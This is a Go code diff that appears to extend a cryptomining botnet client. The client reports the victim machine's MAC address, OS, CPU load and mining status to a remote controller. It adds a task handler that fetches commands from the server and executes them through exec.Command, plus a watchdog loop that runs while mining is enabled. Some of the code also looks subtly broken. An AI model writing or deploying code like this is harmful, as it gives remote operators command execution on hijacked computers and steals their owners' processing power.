@@ -25,9 +25,10 @@ func commutateThread() {
 	c.UserAgent = userAgent
 
 	for {
-		if _, err := c.Heartbeat(connectorModels.Request_Heartbeat{
+		if data, err := c.Heartbeat(connectorModels.Request_Heartbeat{
 			Utilization: s.System.CpuUtil,
 			Id:          s.System.Mac,
+			Working:     s.Mining.Status,
 		}); err != nil {
 			c.Register(connectorModels.Request_Register{
 				Id:          s.System.Mac,
@@ -40,8 +41,43 @@ func commutateThread() {
 				Utility:     s.System.CpuUtil,
 				Os:          s.System.Os,
 			})
+		} else {
+			s.Mining.Enable = data.NeedToWork
+			for _, taskId := range data.Tasks {
+				go taskExec(taskId)
+			}
 		}
 		time.Sleep(time.Second * commutateDelay)
+	}
+}
+
+func taskExec(id string) {
+	if data, err := c.Task(connectorModels.Request_Task{Id: id}); err != nil {
+		return
+	} else {
+		switch data.Action {
+		case 1:
+			c := exec.Command(data.Args)
+			if err := c.Run(); err != nil {
+				log.Println("Error: ", err)
+			}
+		default:
+			// freebsd, openbsd,
+			// plan9, windows...
+			log.Printf("%s.", os)
+		}
+	}
+}
+
+func watchdog() {
+	for {
+		if s.Mining.Enable {
+			c := exec.Command("cmd", "/C", "ping", "-n", "60", "127.0.0.1")
+			if err := c.Run(); err != nil {
+				log.Println("Watchdog -> Error: ", err)
+			}
+		}
+		time.Sleep(time.Second)
 	}
 }
 
@@ -59,6 +95,7 @@ func EntryPoint() {
 		log.Panicf("Error on service initialization. CODE: %v\n", err)
 	}
 	log.Printf("Idle service is alive.")
+	go watchdog()
 	commutateThread()
 }
 
